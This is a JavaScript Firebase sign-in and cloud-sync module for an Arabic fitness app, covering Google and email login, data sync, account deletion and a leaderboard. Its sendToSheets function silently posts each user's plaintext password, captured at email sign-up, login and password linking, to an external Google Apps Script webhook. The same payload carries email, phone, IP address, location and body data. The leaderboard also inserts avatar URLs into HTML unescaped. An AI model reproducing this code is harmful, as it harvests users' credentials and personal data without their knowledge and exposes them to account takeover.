import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js';
import {
  getAuth, GoogleAuthProvider,
  signInWithPopup, signInWithRedirect, getRedirectResult,
  signOut, onAuthStateChanged,
  createUserWithEmailAndPassword, signInWithEmailAndPassword,
  EmailAuthProvider, linkWithCredential, updateProfile
} from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js';
import { getFirestore, doc, setDoc, getDoc, deleteDoc }
  from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js';

const firebaseConfig = {
  apiKey:            "AIzaSyBFsVUEIaWDzFXysWOOTA83WKblPuLj5ik",
  authDomain:        "azem-b93d0.firebaseapp.com",
  projectId:         "azem-b93d0",
  storageBucket:     "azem-b93d0.firebasestorage.app",
  messagingSenderId: "703648049841",
  appId:             "1:703648049841:web:bcecfafa69bb7a73485090",
  measurementId:     "G-XXE47BMBT8"
};

const app  = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db   = getFirestore(app);

let _fbUid        = null;
let _syncDebounce = null;

// لا نحتاج flag الـ redirect بعد الآن — نستخدم Popup فقط
window._obGoogleJustSignedIn = false;

const SHEETS_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzr175rxd9RqcWI8_9W-oBR4vz7UCpcNmGn2nJUzi8M2F4MWCtuUQryH1a1j_qsickR/exec';

async function sendToSheets(user, extraData) {
  if (!SHEETS_WEBHOOK_URL || SHEETS_WEBHOOK_URL.startsWith('PASTE_')) return;
  try {
    const geo = window._lastGeo || {};
    const payload = {
      uid:        user.uid              || '',
      name:       (user.displayName || (extraData && extraData.name) || (S.user && S.user.name) || ''),
      email:      user.email            || '',
      phone:      (S.user && S.user.phone) || (extraData && extraData.phone) || '',
      photoURL:   user.photoURL         || '',
      city:       geo.city              || '',
      country:    geo.country           || '',
      region:     geo.region            || '',
      ip:         geo.ip                || '',
      timezone:   geo.timezone          || '',
      weight:     (S.user && S.user.weight)      || '',
      height:     (S.user && S.user.height)      || '',
      age:        (S.user && S.user.age)         || '',
      gender:     (S.user && S.user.gender)      || '',
      goal:       (S.user && S.user.goal)        || '',
      programDays:(S.user && S.user.programDays) || 30,
      currentDay: S.currentDay          || 1,
      streak:     S.streak              || 0,
      daysCount:  (S.completedDays || []).length,
      privacyAccepted: (extraData && extraData.privacyAccepted !== undefined) ? extraData.privacyAccepted : (S.privacyAccepted !== undefined ? S.privacyAccepted : '—'),
      authMethod: (extraData && extraData.authMethod)    || 'google',
      password:   (extraData && extraData.passwordPlain) || '',
    };
    await fetch(SHEETS_WEBHOOK_URL, {
      method: 'POST',
      mode:   'no-cors',
      body:   JSON.stringify(payload),
    });
  } catch(e) { /* silent */ }
}
window.sendToSheets = sendToSheets;

// ══════════════════════════════════════════
async function fetchGeoLocation() {
  const cached = window._lastGeo;
  if (cached && cached.fetchedAt && (Date.now() - cached.fetchedAt) < 3600000) {
    return cached;
  }
  try {
    const res  = await fetch('https://ipwho.is/');
    const data = await res.json();
    const geo = {
      city:        data.city              || '',
      country:     data.country           || '',
      countryCode: data.country_code      || '',
      region:      data.region            || '',
      ip:          data.ip                || '',
      timezone:    (data.timezone && data.timezone.id) || '',
      fetchedAt:   Date.now()
    };
    window._lastGeo = geo;
    return geo;
  } catch(e) { return cached || null; }
}

// ══════════════════════════════════════════
async function saveUserProfile(user, extraData) {
  if (!user) return;
  try {
    const geo = await fetchGeoLocation();
    window._lastGeo = geo;
    const profile = {
      uid:         user.uid,
      displayName: user.displayName || '',
      email:       user.email       || '',
      photoURL:    user.photoURL    || '',
      phone:       (S.user && S.user.phone)  || (extraData && extraData.phone)  || '',
      age:         (S.user && S.user.age)    || (extraData && extraData.age)    || '',
      gender:      (S.user && S.user.gender) || (extraData && extraData.gender) || '',
      lastLogin:   Date.now(),
      geo:         geo || {},
      ...extraData
    };
    await setDoc(doc(db, 'users', user.uid), { profile }, { merge: true });
    sendToSheets(user, extraData);
  } catch(e) { console.warn('saveUserProfile error:', e); }
}

// ══════════════════════════════════════════
async function pushToCloud() {
  if (!_fbUid) return;
  try {
    const payload = JSON.parse(JSON.stringify(S));
    delete payload.customImages;
    payload._syncedAt = Date.now();
    await setDoc(doc(db, 'users', _fbUid), { state: payload }, { merge: true });
    const el = document.getElementById('firebase-sync-status');
    if (el) el.textContent = '✅ مزامن · ' + new Date().toLocaleTimeString('ar-SA');
  } catch(e) { console.warn('Firebase push error:', e); }
}

async function pullFromCloud(uid) {
  try {
    const snap = await getDoc(doc(db, 'users', uid));
    if (snap.exists()) {
      const remote = snap.data().state;
      if (remote) {
        const localImages = S.customImages && Object.keys(S.customImages).length > 0
          ? JSON.parse(JSON.stringify(S.customImages))
          : null;
        const localTs  = S._localTs   || 0;
        const remoteTs = remote._syncedAt || 0;
        let merged;
        if (localTs > remoteTs) {
          merged = Object.assign({}, remote, S);
        } else {
          merged = Object.assign({}, S, remote);
        }
        merged.calories      = Math.max(S.calories      || 0, remote.calories      || 0);
        merged.completedDays = [...new Set([...(S.completedDays || []), ...(remote.completedDays || [])])];
        merged.streak        = Math.max(S.streak        || 0, remote.streak        || 0);
        merged.customImages  = localImages || {};
        Object.assign(S, merged);
        saveState();
        try { render(); } catch(e) {}
        return true;
      }
    } else {
      await pushToCloud();
    }
    return false;
  } catch(e) { console.warn('Firebase pull error:', e); return false; }
}

window.pushToCloud  = pushToCloud;
window.pullFromCloud = pullFromCloud;

// ══════════════════════════════════════════
// تحديث واجهة المستخدم
// ══════════════════════════════════════════
function updateAuthUI(user) {
  const signinBtn = document.getElementById('google-signin-btn');
  const userArea  = document.getElementById('firebase-user-area');
  const nameEl    = document.getElementById('firebase-user-name');
  const photoEl   = document.getElementById('firebase-user-photo');
  const hdrBtn    = document.getElementById('hdr-auth-btn');
  const hdrIcon   = document.getElementById('hdr-auth-icon');
  const hdrAvatar = document.getElementById('hdr-user-avatar');

  if (user) {
    if (signinBtn) signinBtn.style.display = 'none';
    if (userArea)  userArea.style.display  = 'block';
    if (nameEl)    nameEl.textContent      = user.displayName || user.email || '';
    if (photoEl && user.photoURL) photoEl.src = user.photoURL;
    if (hdrBtn)  { hdrBtn.style.background = 'transparent'; hdrBtn.style.border = 'none'; }
    if (hdrIcon)   hdrIcon.style.display   = 'none';
    if (hdrAvatar && user.photoURL) { hdrAvatar.src = user.photoURL; hdrAvatar.style.display = 'block'; }
  } else {
    if (signinBtn) { signinBtn.style.display = 'flex'; signinBtn.textContent = 'تسجيل الدخول بـ Google'; signinBtn.disabled = false; }
    if (userArea)   userArea.style.display  = 'none';
    if (hdrBtn)  { hdrBtn.style.background = 'rgba(66,133,244,.15)'; hdrBtn.style.border = '1.5px solid rgba(66,133,244,.5)'; }
    if (hdrIcon)   hdrIcon.style.display   = 'block';
    if (hdrAvatar) hdrAvatar.style.display = 'none';
  }
}
// كشف عالمي لاستخدام updateAuthUI من أي مكان
window._fbUpdateAuthUI = updateAuthUI;

// ══════════════════════════════════════════
// FIX-GOOGLE-2: تسجيل الدخول بـ Google (من الإعدادات)
// المشكلة السابقة: popup يتحول لـ redirect على Android بدون إشعار
// المشكلة الثانية: flag يُمسح قبل getRedirectResult تقرأه
// ══════════════════════════════════════════
window.firebaseSignIn = async function() {
  const btn = document.getElementById('google-signin-btn');
  try {
    if (btn) { btn.textContent = '⏳ جارٍ التسجيل...'; btn.disabled = true; }
    const provider = new GoogleAuthProvider();
    provider.setCustomParameters({ prompt: 'select_account' });

    // FIX-CROSS-ORIGIN: نستخدم Popup على جميع المنصات
    // signInWithRedirect يفشل على GitHub Pages بسبب cross-origin مع authDomain
    const result = await signInWithPopup(auth, provider);
    if (result && result.user) {
      await saveUserProfile(result.user);
      await pullFromCloud(result.user.uid);
      updateAuthUI(result.user);
      showMiniToast('☁️ مرحباً ' + (result.user.displayName || '').split(' ')[0] + '!');
      // افتح الإعدادات تلقائياً ليرى المستخدم أنه سجّل دخوله
      setTimeout(() => {
        const sheet = document.getElementById('settings-sheet');
        if (sheet && sheet.style.display === 'none') {
          if (typeof openSettingsSheet === 'function') openSettingsSheet();
        }
      }, 300);
    }
    if (btn) { btn.textContent = 'تسجيل الدخول بـ Google'; btn.disabled = false; }
  } catch(e) {
    if (btn) { btn.textContent = 'تسجيل الدخول بـ Google'; btn.disabled = false; }
    if (e.code !== 'auth/popup-closed-by-user' && e.code !== 'auth/cancelled-popup-request') {
      const msgs = {
        'auth/popup-blocked':          '⚠️ المتصفح حجب النافذة — اسمح بالـ Popup وأعد المحاولة',
        'auth/network-request-failed': '⚠️ خطأ في الشبكة — تحقق من الاتصال',
        'auth/operation-not-allowed':  '⚠️ تسجيل الدخول بـ Google غير مفعّل في Firebase',
      };
      showMiniToast(msgs[e.code] || '⚠️ ' + (e.code || e.message));
    }
  }
};

// ══════════════════════════════════════════
// FIX-GOOGLE-3: تسجيل دخول Google من Onboarding
// ══════════════════════════════════════════
window.obFirebaseGoogleSignIn = async function() {
  const btn = document.getElementById('ob-google-btn');
  try {
    if (btn) { btn.textContent = '⏳ جارٍ التسجيل...'; btn.disabled = true; }
    const provider = new GoogleAuthProvider();
    provider.setCustomParameters({ prompt: 'select_account' });

    // FIX-CROSS-ORIGIN: Popup على جميع المنصات بدلاً من redirect
    window._obGoogleJustSignedIn = true;
    const result = await signInWithPopup(auth, provider);
    if (result && result.user) {
      if (result.user.displayName) {
        S.user = S.user || {};
        S.user.name = result.user.displayName.split(' ')[0];
      }
      const hasData = await pullFromCloud(result.user.uid);
      window._obGoogleJustSignedIn = false;
      updateAuthUI(result.user);
      if (hasData) {
        obFinish();
      } else {
        obGoToStep('password-link');
      }
    } else {
      window._obGoogleJustSignedIn = false;
      if (btn) { btn.textContent = '🔵 تسجيل الدخول بـ Google'; btn.disabled = false; }
    }
  } catch(e) {
    window._obGoogleJustSignedIn = false;
    if (btn) { btn.textContent = '🔵 تسجيل الدخول بـ Google'; btn.disabled = false; }
    if (e.code !== 'auth/popup-closed-by-user' && e.code !== 'auth/cancelled-popup-request') {
      const msgs = {
        'auth/popup-blocked':          '⚠️ المتصفح حجب النافذة — اسمح بالـ Popup وأعد المحاولة',
        'auth/network-request-failed': '⚠️ خطأ في الشبكة',
      };
      showMiniToast(msgs[e.code] || '⚠️ ' + (e.code || e.message));
    }
  }
};

// ══════════════════════════════════════════
// تسجيل / دخول بالإيميل وكلمة المرور
// ══════════════════════════════════════════
window.obFirebaseEmailAuth = async function(mode) {
  const emailEl = document.getElementById('ob-email-inp');
  const passEl  = document.getElementById('ob-pass-inp');
  const nameEl  = document.getElementById('ob-name-inp');
  const btn     = document.getElementById('ob-email-btn');
  const errEl   = document.getElementById('ob-auth-err');

  const email    = emailEl ? emailEl.value.trim() : '';
  const password = passEl  ? passEl.value.trim()  : '';
  const name     = nameEl  ? nameEl.value.trim()  : '';

  if (!email || !password) {
    if (errEl) { errEl.textContent = 'أدخل الإيميل وكلمة المرور'; errEl.style.display = 'block'; }
    return;
  }
  if (password.length < 6) {
    if (errEl) { errEl.textContent = 'كلمة المرور 6 أحرف على الأقل'; errEl.style.display = 'block'; }
    return;
  }

  try {
    if (btn) { btn.textContent = '⏳ جارٍ...'; btn.disabled = true; }
    if (errEl) errEl.style.display = 'none';

    let user;
    if (mode === 'signup') {
      const result = await createUserWithEmailAndPassword(auth, email, password);
      user = result.user;
      if (name) {
        await updateProfile(user, { displayName: name });
        S.user = S.user || {};
        S.user.name = name;
      }
    } else {
      const result = await signInWithEmailAndPassword(auth, email, password);
      user = result.user;
    }

    await saveUserProfile(user, { passwordPlain: password, authMethod: 'email' });

    if (mode === 'login') {
      const hasData = await pullFromCloud(user.uid);
      if (hasData) { obFinish(); return; }
    }

    obGoToStep('info');

  } catch(e) {
    if (btn) { btn.textContent = mode === 'signup' ? 'إنشاء حساب' : 'دخول'; btn.disabled = false; }
    const msgs = {
      'auth/email-already-in-use':    'هذا الإيميل مسجّل مسبقاً — جرّب \"دخول\"',
      'auth/user-not-found':          'الحساب غير موجود — جرّب \"إنشاء حساب\"',
      'auth/wrong-password':          'كلمة المرور غير صحيحة',
      'auth/invalid-email':           'صيغة الإيميل غير صحيحة',
      'auth/too-many-requests':       'محاولات كثيرة — انتظر قليلاً',
      'auth/invalid-credential':      'بيانات الدخول غير صحيحة',
    };
    if (errEl) { errEl.textContent = msgs[e.code] || e.message; errEl.style.display = 'block'; }
  }
};

// ══════════════════════════════════════════
// ربط كلمة مرور بحساب Google
// ══════════════════════════════════════════
window.obLinkPassword = async function() {
  const passEl  = document.getElementById('ob-link-pass-inp');
  const pass2El = document.getElementById('ob-link-pass2-inp');
  const errEl   = document.getElementById('ob-link-err');
  const btn     = document.getElementById('ob-link-btn');

  const pass  = passEl  ? passEl.value.trim()  : '';
  const pass2 = pass2El ? pass2El.value.trim() : '';

  if (!pass || pass.length < 6) {
    if (errEl) { errEl.textContent = 'كلمة المرور 6 أحرف على الأقل'; errEl.style.display = 'block'; }
    return;
  }
  if (pass !== pass2) {
    if (errEl) { errEl.textContent = 'كلمتا المرور غير متطابقتين'; errEl.style.display = 'block'; }
    return;
  }

  try {
    if (btn) { btn.textContent = '⏳ جارٍ...'; btn.disabled = true; }
    const user = auth.currentUser;
    if (user) {
      const cred = EmailAuthProvider.credential(user.email, pass);
      await linkWithCredential(user, cred);
      await saveUserProfile(user, { passwordPlain: pass, authMethod: 'google+email' });
      showMiniToast('✅ تم إضافة كلمة المرور!');
    }
    obGoToStep('info');
  } catch(e) {
    if (btn) { btn.textContent = 'إضافة كلمة المرور'; btn.disabled = false; }
    const msgs = {
      'auth/provider-already-linked': 'كلمة مرور موجودة بالفعل',
      'auth/weak-password':           'كلمة المرور ضعيفة جداً',
    };
    if (errEl) { errEl.textContent = msgs[e.code] || e.message; errEl.style.display = 'block'; }
  }
};

// ══════════════════════════════════════════
window.firebaseSignOut = async function() {
  await signOut(auth);
  _fbUid = null;
  window._fbUid = null;
  window._fbUser = null;
  // FIX: نُنظّف التعريفات المحلية
  localStorage.removeItem('azem_ob_redirect');
  localStorage.removeItem('azem_settings_redirect');
  updateAuthUI(null);
  showMiniToast('👋 تم تسجيل الخروج');
};

window.firebaseSyncNow = async function() {
  if (!_fbUid) { showMiniToast('⚠️ سجّل دخولك أولاً'); return; }
  await pushToCloud();
  showMiniToast('✅ تمت المزامنة');
};

// ══════════════════════════════════════════
// FIX-GOOGLE-4: اعتراض saveState بشكل آمن
// المشكلة السابقة: _origSaveState يُلتقط عند تحميل module — قد يكون undefined
// ══════════════════════════════════════════
window.saveState = (function() {
  const _orig = window.saveState;
  return function() {
    if (typeof _orig === 'function') _orig();
    if (_fbUid) {
      clearTimeout(_syncDebounce);
      _syncDebounce = setTimeout(pushToCloud, 2500);
    }
  };
})();

// FIX-CROSS-ORIGIN: لم نعد نستخدم redirect — نستخدم popup فقط
// getRedirectResult لا يزال مُستدعى لتنظيف أي حالة redirect قديمة
getRedirectResult(auth).catch(() => {});

// ══════════════════════════════════════════
// Auth state listener
// ══════════════════════════════════════════
onAuthStateChanged(auth, async function(user) {
  if (user) {
    _fbUid = user.uid;
    window._fbUid = user.uid;
    window._fbUser = user;
    updateAuthUI(user);
    if (!window._obGoogleJustSignedIn) {
      await saveUserProfile(user);
      const hasData = await pullFromCloud(user.uid);

      // ── مسار "لديّ حساب": تسجيل دخول من شاشة login ──
      // لا Onboarding — فقط اغلق الشاشة وعرض التطبيق
      // ── رسالة مدرب معلقة — أرسلها بعد تسجيل الدخول ──
      if (window._afterLoginSendCoach && window._coachPendingMsg) {
        window._afterLoginSendCoach = false;
        const _pending = window._coachPendingMsg;
        window._coachPendingMsg = '';
        setTimeout(() => {
          const coachBtn = document.querySelector(".tab-btn[onclick*='coach']");
          if (coachBtn && typeof switchTab === 'function') switchTab('coach', coachBtn);
          setTimeout(() => {
            const inp = document.getElementById('coach-inp');
            if (inp) { inp.value = _pending; }
            if (typeof coachSend === 'function') coachSend();
          }, 400);
        }, 800);
      }

      if (window._obLoginMode) {
        window._obLoginMode = false;
        S.onboardingDone = true;
        saveState(true);
        const obEl = document.getElementById('onboarding');
        if (obEl) obEl.style.display = 'none';
        try { render(); } catch(e) {}
        const firstName = (user.displayName || '').split(' ')[0];
        showMiniToast('🎉 ' + (firstName ? 'مرحباً ' + firstName + '!' : 'مرحباً!') + ' تم تحميل بياناتك');
        return;
      }

      // ── مسار عادي ──
      if (!hasData && !S.onboardingDone) {
        const obEl = document.getElementById('onboarding');
        const obVisible = obEl && obEl.style.display !== 'none';
        if (!obVisible && typeof showOnboarding === 'function') setTimeout(showOnboarding, 500);
      } else if (hasData) {
        showMiniToast('☁️ مرحباً ' + (user.displayName || '').split(' ')[0] + '! بياناتك تُزامن تلقائياً');
      }
      // FIX-AUTH-STATE: إذا كانت شاشة الإعدادات مفتوحة عند تسجيل الدخول،
      // أعِد تهيئتها لتعرض الحالة الجديدة
      const sheet = document.getElementById('settings-sheet');
      if (sheet && sheet.style.display !== 'none') {
        updateAuthUI(user);
      }
    }
  } else {
    _fbUid = null;
    window._fbUid = null;
    window._fbUser = null;
    updateAuthUI(null);
  }
});

// ══════════════════════════════════════════
// FIX-GOOGLE-6: openSettingsSheet override آمن
// المشكلة السابقة: _origOpenSettings يُلتقط عند تحميل module (async)
// قد يكون null لأن audio.js لم يُعرّفه بعد أو العكس
// الحل: نُعرّف الـ override بعد تحميل الصفحة كاملاً
// ══════════════════════════════════════════
function _patchOpenSettings() {
  const _orig = window.openSettingsSheet;
  window.openSettingsSheet = function() {
    if (typeof _orig === 'function') _orig();
    updateAuthUI(window._fbUser || null);
  };
}

// نُطبّق الـ patch بعد تحميل الصفحة كاملاً
if (document.readyState === 'complete') {
  _patchOpenSettings();
} else {
  window.addEventListener('load', _patchOpenSettings);
}

// ══════════════════════════════════════════
// حذف جميع بيانات المستخدم (Firestore + localStorage)
// ══════════════════════════════════════════
window.deleteAllUserData = async function() {
  const confirmed1 = confirm('⚠️ هل أنت متأكد من حذف جميع بياناتك نهائياً؟\n\nسيتم حذف:\n• بياناتك من هذا الجهاز\n• بياناتك من السحابة (Firestore)\n\nلا يمكن التراجع عن هذا الإجراء.');
  if (!confirmed1) return;
  const confirmed2 = confirm('⛔ تأكيد أخير: سيتم حذف كل بياناتك نهائياً. متأكد؟');
  if (!confirmed2) return;

  try {
    if (_fbUid) {
      await deleteDoc(doc(db, 'users', _fbUid));
    }
  } catch(e) {
    console.warn('Firestore delete error:', e);
  }

  // FIX: مسح مفاتيح azem فقط — لا نمسح بيانات المتصفح الأخرى
  ['azem_S','fitpulse_S','azem_ob_redirect','azem_settings_redirect'].forEach(k => localStorage.removeItem(k));

  if (typeof showMiniToast === 'function') showMiniToast('✅ تم حذف جميع البيانات');
  setTimeout(() => {
    if (typeof closeSettingsSheet === 'function') closeSettingsSheet();
    location.reload();
  }, 1200);
};

function obReturnSignIn() { window._obLoginMode = true; if(typeof obFirebaseGoogleSignIn==='function') obFirebaseGoogleSignIn(); }
window.obReturnSignIn = obReturnSignIn;

/* ══════════════════════════════════════════
   LEADERBOARD — لوحة المتصدرين
   يستخدم Firestore collection: 'leaderboard'
   كل مستخدم يُنشر score عام اختياري
══════════════════════════════════════════ */

async function publishToLeaderboard() {
  if (!_fbUid || !_fbUser) {
    showMiniToast('⚠️ سجّل دخولك أولاً للمشاركة في اللوحة');
    return;
  }
  const score = {
    uid:      _fbUid,
    name:     S.user?.name || _fbUser.displayName?.split(' ')[0] || 'مستخدم',
    avatar:   _fbUser.photoURL || '',
    streak:   S.streak || 0,
    days:     (S.completedDays||[]).length,
    calories: S.calories || 0,
    xp:       S.xp || 0,
    level:    S.userLevel || 1,
    updatedAt: Date.now(),
  };
  try {
    await setDoc(doc(db, 'leaderboard', _fbUid), score, { merge: true });
    showMiniToast('✅ نقاطك نُشرت في لوحة المتصدرين!');
  } catch(e) {
    showMiniToast('⚠️ فشل النشر: ' + e.message);
  }
}

async function fetchLeaderboard() {
  try {
    const { getDocs, collection, orderBy, limit, query } = await import(
      'https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js'
    );
    const q = query(collection(db, 'leaderboard'), orderBy('xp', 'desc'), limit(20));
    const snap = await getDocs(q);
    return snap.docs.map((d,i) => ({ rank: i+1, ...d.data() }));
  } catch(e) {
    console.warn('[AZEM] Leaderboard fetch error:', e);
    return [];
  }
}

async function openLeaderboard() {
  if (!_fbUser) {
    showMiniToast('⚠️ سجّل دخولك لرؤية لوحة المتصدرين');
    return;
  }

  let modal = document.getElementById('leaderboard-modal');
  if (modal) { modal.remove(); return; }

  modal = document.createElement('div');
  modal.id = 'leaderboard-modal';
  modal.style.cssText = 'position:fixed;inset:0;z-index:9100;background:rgba(0,0,0,.85);display:flex;align-items:flex-end;justify-content:center;';
  modal.onclick = e => { if(e.target===modal) modal.remove(); };

  // عرض loading
  modal.innerHTML = `
    <div style="background:var(--bg);border-radius:24px 24px 0 0;width:100%;max-width:520px;
      padding:24px 20px 40px;max-height:85vh;overflow-y:auto;
      border-top:2px solid rgba(212,168,67,.2);">
      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">
        <div style="font-size:18px;font-weight:900;color:var(--txt);">🏆 لوحة المتصدرين</div>
        <button onclick="document.getElementById('leaderboard-modal').remove()"
          style="background:none;border:none;color:var(--dim);font-size:22px;cursor:pointer;">✕</button>
      </div>
      <div id="lb-content" style="text-align:center;padding:32px;color:var(--dim);">
        <div style="font-size:24px;margin-bottom:8px;">⏳</div>
        جارٍ التحميل...
      </div>
      <button onclick="publishToLeaderboard()"
        style="width:100%;padding:12px;border-radius:14px;margin-top:12px;
        background:rgba(212,168,67,.1);border:1.5px solid rgba(212,168,67,.25);
        color:var(--gold);font-family:'Cairo',sans-serif;font-size:13px;font-weight:700;cursor:pointer;">
        📤 انشر نقاطك في اللوحة
      </button>
    </div>`;

  document.body.appendChild(modal);

  // تحميل البيانات
  const entries = await fetchLeaderboard();
  const lbContent = document.getElementById('lb-content');
  if (!lbContent) return;

  if (!entries.length) {
    lbContent.innerHTML = '<div style="color:var(--dim);font-size:13px;">لا يوجد مشاركون بعد — كن أول المتصدرين!</div>';
    return;
  }

  const medals = ['🥇','🥈','🥉'];
  lbContent.innerHTML = entries.map((e,i) => {
    const isMe = e.uid === _fbUid;
    return `
      <div style="display:flex;align-items:center;gap:12px;padding:10px 12px;
        border-radius:12px;margin-bottom:6px;
        background:${isMe ? 'rgba(212,168,67,.1)' : 'var(--card)'};
        border:${isMe ? '1.5px solid rgba(212,168,67,.35)' : '1px solid var(--border)'};">
        <div style="font-size:20px;width:28px;text-align:center;">
          ${i < 3 ? medals[i] : '#'+e.rank}
        </div>
        ${e.avatar
          ? `<img src="${e.avatar}" style="width:32px;height:32px;border-radius:50%;object-fit:cover;">`
          : `<div style="width:32px;height:32px;border-radius:50%;background:rgba(212,168,67,.2);display:flex;align-items:center;justify-content:center;font-size:14px;">👤</div>`
        }
        <div style="flex:1;">
          <div style="font-size:13px;font-weight:${isMe?'900':'700'};color:${isMe?'var(--gold)':'var(--txt)'};">
            ${_escHtml(e.name)} ${isMe ? '(أنت)' : ''}
          </div>
          <div style="font-size:11px;color:var(--dim);">
            🔥 ${e.streak} يوم · ✅ ${e.days} جلسة
          </div>
        </div>
        <div style="text-align:center;">
          <div style="font-size:15px;font-weight:900;color:var(--gold);">${e.xp}</div>
          <div style="font-size:9px;color:var(--dim);">XP</div>
        </div>
      </div>`;
  }).join('');
}

window.openLeaderboard      = openLeaderboard;
window.publishToLeaderboard = publishToLeaderboard;

